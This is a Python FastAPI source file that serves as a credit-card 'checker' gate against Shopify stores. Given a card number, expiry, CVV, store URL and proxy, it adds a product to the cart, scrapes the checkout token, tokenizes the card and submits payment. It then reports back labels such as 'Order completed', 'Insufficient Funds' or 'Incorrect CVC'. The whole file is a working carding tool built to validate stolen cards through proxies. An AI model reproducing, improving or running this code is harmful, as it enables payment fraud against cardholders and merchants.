from fastapi import FastAPI, Query
from fastapi.responses import JSONResponse
import aiohttp
import re
import json

app = FastAPI()

def get_headers(host):
    return {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Host": host
    }

def format_proxy(proxy_str):
    if not proxy_str: return None
    parts = proxy_str.split(':')
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return f"http://{user}:{pwd}@{ip}:{port}"
    elif len(parts) == 2:
        ip, port = parts
        return f"http://{ip}:{port}"
    return proxy_str if proxy_str.startswith('http') else f"http://{proxy_str}"

async def check_shopify(cc_info, store_url, proxy):
    try:
        cc_parts = re.findall(r'\d+', cc_info.replace('|', ' '))
        if len(cc_parts) < 4: return {"Response": "Invalid CC Format", "Price": "-", "Gate": "Shopify Custom API"}
        cc, mm, yy, cvv = cc_parts[0], cc_parts[1], cc_parts[2], cc_parts[3]
        if len(yy) == 2: yy = "20" + yy

        store_url = store_url.rstrip('/')
        domain = store_url.replace("https://", "").replace("http://", "")
        formatted_proxy = format_proxy(proxy)

        timeout = aiohttp.ClientTimeout(total=45)
        async with aiohttp.ClientSession(cookie_jar=aiohttp.CookieJar(), timeout=timeout) as session:
            
            # 1. Fetch Product
            prod_url = f"{store_url}/products.json?limit=1"
            async with session.get(prod_url, headers=get_headers(domain), proxy=formatted_proxy) as res:
                if res.status != 200: return {"Response": "Site Dead or Protected (Products)", "Price": "-", "Gate": "Shopify Custom API"}
                prod_data = await res.json()
                variant_id = prod_data['products'][0]['variants'][0]['id']
                price = prod_data['products'][0]['variants'][0]['price']

            # 2. Add to Cart
            add_url = f"{store_url}/cart/add.js"
            add_data = {"id": variant_id, "quantity": 1}
            async with session.post(add_url, data=add_data, headers=get_headers(domain), proxy=formatted_proxy) as res:
                if res.status != 200: return {"Response": "Cart Add Failed", "Price": price, "Gate": "Shopify Custom API"}

            # 3. Get Checkout Token
            checkout_url = f"{store_url}/checkout"
            async with session.get(checkout_url, headers=get_headers(domain), proxy=formatted_proxy) as res:
                checkout_html = await res.text()
                checkout_final_url = str(res.url)
                
                auth_token_match = re.search(r'name="authenticity_token" value="([^"]+)"', checkout_html)
                if not auth_token_match: return {"Response": "Failed to get Checkout Token", "Price": price, "Gate": "Shopify Custom API"}
                auth_token = auth_token_match.group(1)

            # 4. Tokenize Card
            token_url = "https://deposit.us.shopifycs.com/sessions"
            token_payload = {"credit_card": {"number": cc, "name": "John Doe", "month": mm, "year": yy, "verification_value": cvv}}
            token_headers = {"Accept": "application/json", "Content-Type": "application/json", "Host": "deposit.us.shopifycs.com"}
            
            async with session.post(token_url, json=token_payload, headers=token_headers, proxy=formatted_proxy) as res:
                if res.status != 200: return {"Response": "Failed to tokenize card (Proxy Blocked)", "Price": price, "Gate": "Shopify Custom API"}
                token_data = await res.json()
                payment_token = token_data.get("id")

            # 5. Submit Payment
            payment_payload = {
                "authenticity_token": auth_token,
                "previous_step": "payment_method",
                "step": "",
                "s": payment_token,
                "checkout[payment_gateway]": "1", 
                "checkout[credit_card][vault]": "false",
                "checkout[different_billing_address]": "false",
                "complete": "1"
            }
            
            async with session.post(checkout_final_url, data=payment_payload, headers=get_headers(domain), proxy=formatted_proxy) as res:
                result_html = await res.text()
                result_html_lower = result_html.lower()
                
                if "thank you" in result_html_lower or "order completed" in result_html_lower or res.url.path.endswith('/thank_you'):
                    return {"Response": "Order completed 💎", "Price": price, "Gate": "Shopify Custom API"}
                elif "insufficient funds" in result_html_lower: return {"Response": "Insufficient Funds", "Price": price, "Gate": "Shopify Custom API"}
                elif "incorrect_cvc" in result_html_lower or "security code was not matched" in result_html_lower: return {"Response": "Incorrect CVC", "Price": price, "Gate": "Shopify Custom API"}
                elif "zip code does not match" in result_html_lower or "avs" in result_html_lower: return {"Response": "ZIP Code Mismatch", "Price": price, "Gate": "Shopify Custom API"}
                elif "do not honor" in result_html_lower: return {"Response": "Do Not Honor", "Price": price, "Gate": "Shopify Custom API"}
                else:
                    error_match = re.search(r'class="field__message field__message--error">([^<]+)<', result_html)
                    if error_match: return {"Response": error_match.group(1).strip(), "Price": price, "Gate": "Shopify Custom API"}
                    return {"Response": "Generic Decline", "Price": price, "Gate": "Shopify Custom API"}

    except Exception as e:
        return {"Response": f"Connection Error: Proxy or Timeout", "Price": "-", "Gate": "Shopify Custom API"}

@app.get("/code/index.php")
async def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query(None)):
    result = await check_shopify(cc, url, proxy)
    return JSONResponse(content=result)